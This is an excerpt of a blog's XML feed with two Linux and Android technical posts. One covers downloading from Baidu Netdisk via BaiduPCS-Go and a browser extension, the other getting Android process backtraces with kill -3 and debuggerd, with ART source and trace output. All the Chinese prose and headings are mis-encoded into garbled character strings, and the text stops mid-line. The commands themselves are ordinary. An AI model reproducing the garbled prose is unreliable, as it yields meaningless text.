    <content type="html"><![CDATA[<p>ç™¾åº¦ç½‘ç›˜åœ¨å›½å†…å¾ˆå¤§æ¦‚ç‡æ˜¯ç»•ä¸è¿‡å»ï¼Œç¨å¤§ç‚¹æ–‡ä»¶éƒ½å–œæ¬¢ç”¨ç™¾åº¦ç½‘ç›˜ç»™ä¸‹è½½åœ°å€ã€‚å¯æ˜¯ç™¾åº¦ç½‘ç›˜ä¸‹è½½<br>æ˜¯é™é€Ÿçš„ï¼Œè€Œä¸”å¯¹ Linux ç”¨æˆ·éå¸¸ä¸å‹å¥½ï¼Œæˆ‘çš„ Fedora è£…ä¸Š rpm åŒ…ä¹Ÿç”¨ä¸äº†ï¼Œç›´æ¥å´©æºƒï¼Œæ‰€ä»¥å¾—æƒ³ç‚¹å…¶ä»–åŠæ³•ã€‚</p><h3 id="1-å®˜æ–¹å®‰è£…åŒ…-ï¼ˆä¸ä¸€å®šéƒ½èƒ½ä½¿ç”¨ï¼‰"><a href="#1-å®˜æ–¹å®‰è£…åŒ…-ï¼ˆä¸ä¸€å®šéƒ½èƒ½ä½¿ç”¨ï¼‰" class="headerlink" title="1. å®˜æ–¹å®‰è£…åŒ… ï¼ˆä¸ä¸€å®šéƒ½èƒ½ä½¿ç”¨ï¼‰"></a>1. å®˜æ–¹å®‰è£…åŒ… ï¼ˆä¸ä¸€å®šéƒ½èƒ½ä½¿ç”¨ï¼‰</h3><p>å®˜æ–¹æä¾›äº† deb å’Œ rpm æ ¼å¼å®‰è£…åŒ…</p><p><a href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm</a><br><a href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb</a></p><p>ä½†æ˜¯åœ¨ Fedora å®‰è£…åï¼Œä¼šæŠ¥é”™è¯¯ã€‚</p><h3 id="2-BaiduPCS-Go-ï¼ˆç™¾åº¦ç½‘ç›˜å®¢æˆ·ç«¯-Goè¯­è¨€ç¼–å†™ï¼‰"><a href="#2-BaiduPCS-Go-ï¼ˆç™¾åº¦ç½‘ç›˜å®¢æˆ·ç«¯-Goè¯­è¨€ç¼–å†™ï¼‰" class="headerlink" title="2. BaiduPCS-Go ï¼ˆç™¾åº¦ç½‘ç›˜å®¢æˆ·ç«¯ - Goè¯­è¨€ç¼–å†™ï¼‰"></a>2. BaiduPCS-Go ï¼ˆç™¾åº¦ç½‘ç›˜å®¢æˆ·ç«¯ - Goè¯­è¨€ç¼–å†™ï¼‰</h3><p><a href="https://github.com/iikira/BaiduPCS-Go">https://github.com/iikira/BaiduPCS-Go</a></p><h4 id="2-1-ç™»å½•"><a href="#2-1-ç™»å½•" class="headerlink" title="2.1 ç™»å½•"></a>2.1 ç™»å½•</h4><p>.&#x2F;BaiduPCS-Go login -bduss&#x3D;xxxxx</p><h4 id="2-2-è®¾ç½®å¹¶å‘"><a href="#2-2-è®¾ç½®å¹¶å‘" class="headerlink" title="2.2 è®¾ç½®å¹¶å‘"></a>2.2 è®¾ç½®å¹¶å‘</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> <span class="hljs-attribute">-max_parallel</span>=50<br></code></pre></td></tr></table></figure><h4 id="2-3-ä¸‹è½½"><a href="#2-3-ä¸‹è½½" class="headerlink" title="2.3 ä¸‹è½½"></a>2.3 ä¸‹è½½</h4><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">download xxxxx</span><br></code></pre></td></tr></table></figure><h3 id="3-ä½¿ç”¨æµè§ˆå™¨æ’ä»¶"><a href="#3-ä½¿ç”¨æµè§ˆå™¨æ’ä»¶" class="headerlink" title="3. ä½¿ç”¨æµè§ˆå™¨æ’ä»¶"></a>3. ä½¿ç”¨æµè§ˆå™¨æ’ä»¶</h3><p><a href="https://github.com/acgotaku/BaiduExporter.git">https://github.com/acgotaku/BaiduExporter.git</a></p><p>å¯ä»¥ç›´æ¥ä½¿ç”¨ä½œè€…æä¾›çš„æ‰“åŒ…å¥½çš„æ’ä»¶, ç›´æ¥å®‰è£…å³å¯ã€‚</p><p><a href="https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx">https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx</a></p><p>è¿™ä¸ªæ’ä»¶å°†ä½¿ç”¨ aria2c ä¸‹è½½ï¼Œä½¿ç”¨å¾—å…ˆå‡†å¤‡ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„aria2c<br>è¦è®© aria2c æ›´å¥½ç”¨ä¸€äº›ï¼Œå¯ä»¥ä¿®æ”¹ä¸€ä¸‹é…ç½®ï¼Œé…ç½®æ–‡ä»¶å¯ä»¥å‚è€ƒ</p><p><a href="https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf">https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android è·å–è¿›ç¨‹çš„ backtrace ä¿¡æ¯</title>
    <link href="/cn/backtrace_in_android/"/>
    <url>/cn/backtrace_in_android/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-ä½¿ç”¨kill-å‘é€-SIGNAL-QUIT"><a href="#â˜†-ä½¿ç”¨kill-å‘é€-SIGNAL-QUIT" class="headerlink" title="â˜† ä½¿ç”¨kill å‘é€ SIGNAL_QUIT"></a>â˜† ä½¿ç”¨kill å‘é€ SIGNAL_QUIT</h2><p>è¿™ç§æ–¹æ³•åªèƒ½ç”¨äºzygote çš„å­è¿›ç¨‹ (æ¯”å¦‚æ‰€æœ‰çš„ app è¿›ç¨‹, éƒ½æ˜¯ç”±zygote fork è€Œæ¥).</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kill -3 pid</span><br><br><span class="hljs-comment"># cat /data/anr/traces.txt</span><br><br><span class="hljs-built_in">..</span>.<br><br>suspend all histogram:  Sum: 290us 99% C.I. 2us-40us Avg: 14.500us Max: 40us<br>DALVIK THREADS (12):<br><span class="hljs-string">&quot;Signal Catcher&quot;</span> daemon <span class="hljs-attribute">prio</span>=5 <span class="hljs-attribute">tid</span>=2 Runnable<br>  | <span class="hljs-attribute">group</span>=<span class="hljs-string">&quot;system&quot;</span> <span class="hljs-attribute">sCount</span>=0 <span class="hljs-attribute">dsCount</span>=0 <span class="hljs-attribute">obj</span>=0x32c070a0 <span class="hljs-attribute">self</span>=0xaecca000<br>  | <span class="hljs-attribute">sysTid</span>=1918 <span class="hljs-attribute">nice</span>=0 <span class="hljs-attribute">cgrp</span>=bg_non_interactive <span class="hljs-attribute">sched</span>=0/0 <span class="hljs-attribute">handle</span>=0xb4406930<br>  | <span class="hljs-attribute">state</span>=R schedstat=( 228351607 17443703 83 ) <span class="hljs-attribute">utm</span>=12 <span class="hljs-attribute">stm</span>=9 <span class="hljs-attribute">core</span>=0 <span class="hljs-attribute">HZ</span>=100<br>  | <span class="hljs-attribute">stack</span>=0xb430a000-0xb430c000 <span class="hljs-attribute">stackSize</span>=1014KB<br>  | held mutexes= <span class="hljs-string">&quot;mutator lock&quot;</span>(shared held)<br>  native: #00 pc 00370e01  /system/lib/libart.so (_ZN3art15DumpNativeStackERNSt3__113basic_ostreamIcNS0_11char_traitsIcEEEEiPKcPNS_9ArtMethodEPv+160)<br>  native: #01 pc 0035046f  /system/lib/libart.so (_ZNK3art6Thread4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+150)<br>  native: #02 pc 0035a373  /system/lib/libart.so (_ZN3art14DumpCheckpoint3RunEPNS_6ThreadE+442)<br>  native: #03 pc 0035af31  /system/lib/libart.so (_ZN3art10ThreadList13RunCheckpointEPNS_7ClosureE+212)<br>  native: #04 pc 0035b45f  /system/lib/libart.so (_ZN3art10ThreadList4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+142)<br>  native: #05 pc 0035bb6f  /system/lib/libart.so (_ZN3art10ThreadList14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+334)<br>  native: #06 pc 00333cb7  /system/lib/libart.so (_ZN3art7Runtime14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+74)<br>  native: #07 pc 0033b01d  /system/lib/libart.so (_ZN3art13SignalCatcher13HandleSigQuitEv+928)<br>  native: #08 pc 0033b901  /system/lib/libart.so (_ZN3art13SignalCatcher3RunEPv+340)<br>  native: #09 pc 0003f45f  /system/lib/libc.so (_ZL15__pthread_startPv+30)<br>  native: #10 pc 00019b43  /system/lib/libc.so (__start_thread+6)<br>  (<span class="hljs-literal">no</span> managed stack frames)<br><br><span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attribute">prio</span>=5 <span class="hljs-attribute">tid</span>=1 Native<br>  | <span class="hljs-attribute">group</span>=<span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attribute">sCount</span>=1 <span class="hljs-attribute">dsCount</span>=0 <span class="hljs-attribute">obj</span>=0x74abb2a0 <span class="hljs-attribute">self</span>=0xb4d76500<br>  | <span class="hljs-attribute">sysTid</span>=1914 <span class="hljs-attribute">nice</span>=0 <span class="hljs-attribute">cgrp</span>=bg_non_interactive <span class="hljs-attribute">sched</span>=0/0 <span class="hljs-attribute">handle</span>=0xb6f3fb34<br>  | <span class="hljs-attribute">state</span>=S schedstat=( 76934470 21396828 203 ) <span class="hljs-attribute">utm</span>=3 <span class="hljs-attribute">stm</span>=3 <span class="hljs-attribute">core</span>=0 <span class="hljs-attribute">HZ</span>=100<br>  | <span class="hljs-attribute">stack</span>=0xbe55e000-0xbe560000 <span class="hljs-attribute">stackSize</span>=8MB<br>  | held mutexes=<br>  native: #00 pc 00040894  /system/lib/libc.so (__epoll_pwait+20)<br>  native: #01 pc 00019e6f  /system/lib/libc.so (epoll_pwait+26)<br><br>  <span class="hljs-built_in">..</span>.<br><br></code></pre></td></tr></table></figure><p>ç»“æœå†™åœ¨ &#x2F;data&#x2F;anr&#x2F;traces.txt æ–‡ä»¶ä¸­, anr æ˜¯ ANR(Application Not Response)çš„æ„æ€.</p><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Runtime::InitNonZygoteOrPostFork</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    JNIEnv* env, <span class="hljs-type">bool</span> is_system_server, NativeBridgeAction action, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* isa)</span> </span>&#123;<br><br>...<br><br>  <span class="hljs-comment">// Create the thread pools.</span><br>  heap_-&gt;<span class="hljs-built_in">CreateThreadPool</span>();<br>  <span class="hljs-comment">// Reset the gc performance data at zygote fork so that the GCs</span><br>  <span class="hljs-comment">// before fork aren&#x27;t attributed to an app.</span><br>  heap_-&gt;<span class="hljs-built_in">ResetGcPerformanceInfo</span>();<br>  <span class="hljs-keyword">if</span> (!is_system_server &amp;&amp;<br>      !safe_mode_ &amp;&amp;<br>      (jit_options_-&gt;<span class="hljs-built_in">UseJitCompilation</span>() || jit_options_-&gt;<span class="hljs-built_in">GetSaveProfilingInfo</span>()) &amp;&amp;<br>      jit_.<span class="hljs-built_in">get</span>() == <span class="hljs-literal">nullptr</span>) &#123;<br>    <span class="hljs-comment">// Note that when running ART standalone (not zygote, nor zygote fork),</span><br>    <span class="hljs-comment">// the jit may have already been created.</span><br>    <span class="hljs-built_in">CreateJit</span>();<br>  &#125;<br>  <span class="hljs-built_in">StartSignalCatcher</span>();<br>  <span class="hljs-comment">// Start the JDWP thread. If the command-line debugger flags specified &quot;suspend=y&quot;,</span><br>  <span class="hljs-comment">// this will pause the runtime, so we probably want this to come last.</span><br>  Dbg::<span class="hljs-built_in">StartJdwp</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºézygoteçš„è¿›ç¨‹éƒ½ä¼šå¯åŠ¨ Signal Catcherçš„ çº¿ç¨‹.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@shamu:/ # ps -t <span class="hljs-number">2089</span><br><span class="hljs-attribute">USER</span>      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2089</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> SyS_epoll_ b6cb0894 S com.hujiang.dict:pushservice<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2092</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> do_sigtime b6cb0b68 S Signal Catcher<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2095</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> unix_strea b6cb194c S JDWP<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2096</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S ReferenceQueueD<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2097</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S FinalizerDaemon<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2099</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S FinalizerWatchd<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2100</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S HeapTaskDaemon<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2101</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> binder_thr b6cb09c0 S Binder_1<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2102</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> binder_thr b6cb09c0 S Binder_2<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2107</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> SyS_epoll_ b6cb0894 S Thread-<span class="hljs-number">123</span><br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2108</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S taskService-pro<br><br><span class="hljs-attribute">zygote</span> è‡ªå·±æ²¡æœ‰è¯¥çº¿ç¨‹.<br><br><span class="hljs-attribute">root</span>@shamu:/ # ps | grep -i zy<br><span class="hljs-attribute">root</span>      <span class="hljs-number">386</span>   <span class="hljs-number">1</span>     <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> poll_sched b6cb0a5c S zygote<br><br><span class="hljs-attribute">127</span>|root@shamu:/ # ps -t <span class="hljs-number">386</span><br><span class="hljs-attribute">USER</span>      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME<br><span class="hljs-attribute">root</span>      <span class="hljs-number">386</span>   <span class="hljs-number">1</span>     <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> poll_sched b6cb0a5c S zygote<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2203</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S ReferenceQueueD<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2204</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S FinalizerDaemon<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2205</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S FinalizerWatchd<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2206</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S HeapTaskDaemon<br><br></code></pre></td></tr></table></figure><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp">...<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SignalCatcher::Output</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; s)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (stack_trace_file_.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-built_in">LOG</span>(INFO) &lt;&lt; s;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>...<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SignalCatcher::HandleSigQuit</span><span class="hljs-params">()</span> </span>&#123;<br>  Runtime* runtime = Runtime::<span class="hljs-built_in">Current</span>();<br>  std::ostringstream os;<br>  os &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span><br>      &lt;&lt; <span class="hljs-string">&quot;----- pid &quot;</span> &lt;&lt; <span class="hljs-built_in">getpid</span>() &lt;&lt; <span class="hljs-string">&quot; at &quot;</span> &lt;&lt; <span class="hljs-built_in">GetIsoDate</span>() &lt;&lt; <span class="hljs-string">&quot; -----\n&quot;</span>;<br>  <span class="hljs-built_in">DumpCmdLine</span>(os);<br>  <span class="hljs-comment">// Note: The strings &quot;Build fingerprint:&quot; and &quot;ABI:&quot; are chosen to match the format used by</span><br>  <span class="hljs-comment">// debuggerd. This allows, for example, the stack tool to work.</span><br>  std::string fingerprint = runtime-&gt;<span class="hljs-built_in">GetFingerprint</span>();<br>  os &lt;&lt; <span class="hljs-string">&quot;Build fingerprint: &#x27;&quot;</span> &lt;&lt; (fingerprint.<span class="hljs-built_in">empty</span>() ? <span class="hljs-string">&quot;unknown&quot;</span> : fingerprint) &lt;&lt; <span class="hljs-string">&quot;&#x27;\n&quot;</span>;<br>  os &lt;&lt; <span class="hljs-string">&quot;ABI: &#x27;&quot;</span> &lt;&lt; <span class="hljs-built_in">GetInstructionSetString</span>(runtime-&gt;<span class="hljs-built_in">GetInstructionSet</span>()) &lt;&lt; <span class="hljs-string">&quot;&#x27;\n&quot;</span>;<br>  os &lt;&lt; <span class="hljs-string">&quot;Build type: &quot;</span> &lt;&lt; (kIsDebugBuild ? <span class="hljs-string">&quot;debug&quot;</span> : <span class="hljs-string">&quot;optimized&quot;</span>) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  runtime-&gt;<span class="hljs-built_in">DumpForSigQuit</span>(os);<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-literal">false</span>)) &#123;<br>    std::string maps;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ReadFileToString</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, &amp;maps)) &#123;<br>      os &lt;&lt; <span class="hljs-string">&quot;/proc/self/maps:\n&quot;</span> &lt;&lt; maps;<br>    &#125;<br>  &#125;<br>  os &lt;&lt; <span class="hljs-string">&quot;----- end &quot;</span> &lt;&lt; <span class="hljs-built_in">getpid</span>() &lt;&lt; <span class="hljs-string">&quot; -----\n&quot;</span>;<br>  <span class="hljs-built_in">Output</span>(os.<span class="hljs-built_in">str</span>());<br>&#125;<br><br>...<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-type">int</span> signal_number = signal_catcher-&gt;<span class="hljs-built_in">WaitForSignal</span>(self, signals);<br>    <span class="hljs-keyword">if</span> (signal_catcher-&gt;<span class="hljs-built_in">ShouldHalt</span>()) &#123;<br>      runtime-&gt;<span class="hljs-built_in">DetachCurrentThread</span>();<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>    <span class="hljs-keyword">switch</span> (signal_number) &#123;<br>    <span class="hljs-keyword">case</span> SIGQUIT:<br>      signal_catcher-&gt;<span class="hljs-built_in">HandleSigQuit</span>();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> SIGUSR1:<br>      signal_catcher-&gt;<span class="hljs-built_in">HandleSigUsr1</span>();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">LOG</span>(ERROR) &lt;&lt; <span class="hljs-string">&quot;Unexpected signal %d&quot;</span> &lt;&lt; signal_number;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>...<br><br></code></pre></td></tr></table></figure><p>ä»æºç ä¸­å‘ç°é™¤äº†SIGQUIT è¿˜å¯ä»¥å‘é€ SIGUSR1 , è¿™ä¸ªä¿¡å·å¯ä»¥ä½¿è¿›ç¨‹java è™šæ‹Ÿæœºæ‰§è¡ŒGC<br>æ“ä½œ <code>kill -10 pid</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SignalCatcher::HandleSigUsr1</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">LOG</span>(INFO) &lt;&lt; <span class="hljs-string">&quot;SIGUSR1 forcing GC (no HPROF)&quot;</span>;<br>  Runtime::<span class="hljs-built_in">Current</span>()-&gt;<span class="hljs-built_in">GetHeap</span>()-&gt;<span class="hljs-built_in">CollectGarbage</span>(<span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="â˜†-ä½¿ç”¨-debugged-å‘½ä»¤è¡Œ"><a href="#â˜†-ä½¿ç”¨-debugged-å‘½ä»¤è¡Œ" class="headerlink" title="â˜† ä½¿ç”¨ debugged å‘½ä»¤è¡Œ"></a>â˜† ä½¿ç”¨ debugged å‘½ä»¤è¡Œ</h2><p>è¿™ç§æ–¹æ³•æ˜¯å…¨ç³»ç»Ÿé€šç”¨çš„, å¯ä»¥ç”¨äºézygoteçš„è¿›ç¨‹.</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Usage: -b [&lt;tid&gt;]<br>  -b dump backtrace <span class="hljs-keyword">to</span> console, <span class="hljs-keyword">otherwise</span> dump full tombstone <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ -b å‚æ•°æŒ‡å®šè¿›ç¨‹pid, å³å¯.</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># debuggerd -b <span class="hljs-number">23850</span><br><br>Sending request to dump task <span class="hljs-number">23850</span>.<br><br><br>----- pid <span class="hljs-number">23850</span> <span class="hljs-built_in">at</span> <span class="hljs-number">1970</span>-<span class="hljs-number">01</span>-<span class="hljs-number">27</span> <span class="hljs-number">03</span>:<span class="hljs-number">57</span>:<span class="hljs-number">11</span> -----<br>Cmd line: /sbin/adbd<br>ABI: &#x27;arm&#x27;<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23850</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b158</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">0002467f</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">00020854</span>  [stack]<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23851</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002fd38</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">0002a501</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">0000000b</span>  &lt;<span class="hljs-literal">unknown</span>&gt;<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span class="hljs-number">23852</span><br>  #<span class="hljs-number">00</span> pc <span class="hljs-number">0002b624</span>  /sbin/adbd<br>  #<span class="hljs-number">01</span> pc <span class="hljs-number">000106cf</span>  /sbin/adbd<br>  #<span class="hljs-number">02</span> pc <span class="hljs-number">00010301</span>  /sbin/adbd<br>  #<span class="hljs-number">03</span> pc <span class="hljs-number">0002a613</span>  /sbin/adbd<br>  #<span class="hljs-number">04</span> pc <span class="hljs-number">00030283</span>  /sbin/adbd<br><br><span class="hljs-string">&quot;adbd&quot;</span> sysTid=<span 